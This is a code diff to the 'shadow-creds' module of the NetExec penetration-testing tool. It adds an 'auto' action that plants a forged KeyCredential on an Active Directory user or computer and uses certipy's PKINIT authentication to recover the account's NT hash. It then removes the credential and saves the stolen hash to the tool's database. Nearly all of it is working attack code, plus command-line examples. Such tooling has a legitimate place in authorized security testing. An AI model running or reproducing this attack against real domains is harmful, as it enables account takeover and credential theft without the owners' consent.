@@ -10,6 +10,9 @@ from dsinternals.system.DateTime import DateTime
 from dsinternals.system.Guid import Guid
 from impacket.ldap.ldap import MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE, LDAPSessionError
 
+from certipy.commands.auth import Authenticate
+from certipy.lib.target import DnsResolver, Target
+
 from nxc.helpers.misc import CATEGORY
 from nxc.parsers.ldap_results import parse_result_attributes
 from nxc.paths import NXC_PATH
@@ -23,20 +26,23 @@ class NXCModule:
     """
 
     name = "shadow-creds"
-    description = "List, add, inspect, remove, clear, backup, or revert Shadow Credentials on a user or computer"
+    description = "List, add, auto, inspect, remove, clear, backup, or revert Shadow Credentials on a user or computer"
     supported_protocols = ["ldap"]
     category = CATEGORY.PRIVILEGE_ESCALATION
+
+    EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"
 
     def options(self, context, module_options):
         """
         TARGET      sAMAccountName of the target user or computer (for example, TARGET=user or TARGET=DESKTOP-123456$)
-        ACTION      Action to perform: list, add, info, remove, clear, backup, or revert (default: list); clear removes all KeyCredentials
+        ACTION      Action to perform: list, add, auto, info, remove, clear, backup, or revert (default: list); auto adds a KeyCredential, UnPACs the NT hash, then removes it; clear removes all KeyCredentials
         DEVICE_ID   KeyCredential device ID; required for info and remove
         JSONFILE    JSON backup path; required for revert and optional for backup
 
         Examples:
         netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=list
         netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=add
+        netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=auto
         netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=info DEVICE_ID=<guid>
         netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=remove DEVICE_ID=<guid>
         netexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=clear
@@ -51,8 +57,8 @@ class NXCModule:
         if not self.target:
             context.log.fail("TARGET is required")
             return False
-        if self.action not in {"list", "add", "info", "remove", "clear", "backup", "revert"}:
-            context.log.fail("ACTION must be one of: list, add, info, remove, clear, backup, revert")
+        if self.action not in {"list", "add", "auto", "info", "remove", "clear", "backup", "revert"}:
+            context.log.fail("ACTION must be one of: list, add, auto, info, remove, clear, backup, revert")
             return False
         if self.action in {"info", "remove"} and not self.device_id:
             context.log.fail(f"DEVICE_ID is required for ACTION={self.action}")
@@ -82,6 +88,8 @@ class NXCModule:
             self.list(self.parse_credentials(raw_values))
         elif self.action == "add":
             self.add(target_dn, "computer" in resp_parsed[0]["objectClass"])
+        elif self.action == "auto":
+            self.auto(target_dn, "computer" in resp_parsed[0]["objectClass"])
         elif self.action == "info":
             self.info(self.parse_credentials(raw_values))
         elif self.action == "remove":
@@ -124,16 +132,14 @@ class NXCModule:
         for _, credential in credentials:
             self.context.log.highlight(f"Device ID: {credential.DeviceId.toFormatD().lower() if credential.DeviceId else '<missing>'} | Creation time: {credential.CreationTime}")
 
+    def generate_credential(self, target_dn, is_computer):
+        certificate = X509Certificate2(subject=self.target, keySize=2048, notBefore=-(40 * 365), notAfter=40 * 365)
+        credential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime(), isComputerKey=is_computer)
+        return certificate, credential
+
     def add(self, target_dn, is_computer):
         try:
-            certificate = X509Certificate2(subject=self.target, keySize=2048, notBefore=-(40 * 365), notAfter=40 * 365)
-            credential = KeyCredential.fromX509Certificate2(
-                certificate=certificate,
-                deviceId=Guid(),
-                owner=target_dn,
-                currentTime=DateTime(),
-                isComputerKey=is_computer,
-            )
+            certificate, credential = self.generate_credential(target_dn, is_computer)
             device_id = credential.DeviceId.toFormatD().lower()
             ldap_value = credential.toDNWithBinary().toString()
             output_path = self.write_pfx(certificate, device_id)
@@ -151,6 +157,62 @@ class NXCModule:
 
         self.context.log.success(f"Added KeyCredential with device ID {device_id} to {self.target}")
         self.context.log.highlight(f"PFX: {output_path}")
+
+    def auto(self, target_dn, is_computer):
+        try:
+            certificate, credential = self.generate_credential(target_dn, is_computer)
+            device_id = credential.DeviceId.toFormatD().lower()
+            ldap_value = credential.toDNWithBinary().toString()
+        except Exception as e:
+            self.context.log.fail(f"Failed to generate certificate and KeyCredential: {e}")
+            return
+
+        try:
+            self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_ADD, [ldap_value])]})
+        except LDAPSessionError as e:
+            self.context.log.fail(f"Failed to add the KeyCredential: {e}")
+            return
+        self.context.log.success(f"Added temporary KeyCredential {device_id} to {self.target}")
+
+        try:
+            nthash = self.unpac(certificate)
+        finally:
+            try:
+                self.connection.ldap_connection.modify(target_dn, {"msDS-KeyCredentialLink": [(MODIFY_DELETE, [ldap_value])]})
+                self.context.log.success(f"Removed temporary KeyCredential {device_id} from {self.target}")
+            except LDAPSessionError as e:
+                self.context.log.fail(f"Failed to remove the temporary KeyCredential {device_id}, remove it manually: {e}")
+
+        if nthash:
+            self.context.log.highlight(f"{self.connection.domain}\\{self.target}: {self.EMPTY_LM}:{nthash}")
+            self.connection.db.add_credential("hash", self.connection.domain, self.target, f"{self.EMPTY_LM}:{nthash}")
+
+    def unpac(self, certificate):
+        auth = Authenticate(target=self.make_target(self.connection), cert=certificate.certificate.to_cryptography(), key=certificate.key.to_cryptography_key())
+        auth.no_save = True
+        auth.authenticate(username=self.target, domain=self.connection.domain, is_key_credential=True)
+        if not auth.nt_hash:
+            self.context.log.fail(f"Could not recover the NT hash for {self.target} (PKINIT failed)")
+        return auth.nt_hash
+
+    def make_target(self, connection):
+        dns_server = getattr(connection.args, "dns_server", None) or connection.kdcHost or connection.host
+        resolver = DnsResolver.create(ns=dns_server, dc_ip=connection.kdcHost or connection.host)
+        return Target(
+            resolver=resolver,
+            domain=connection.domain,
+            username=connection.username,
+            password=connection.password,
+            remote_name=connection.remoteName,
+            hashes=f"{connection.lmhash}:{connection.nthash}",
+            lmhash=connection.lmhash,
+            nthash=connection.nthash,
+            do_kerberos=connection.kerberos,
+            aes=connection.aesKey,
+            dc_ip=connection.kdcHost or connection.host,
+            target_ip=connection.kdcHost or connection.host,
+            ldap_scheme="ldaps" if connection.port == 636 else "ldap",
+        )
 
     def write_pfx(self, certificate, device_id):
         output_dir = Path(NXC_PATH) / "modules" / "shadow-creds"
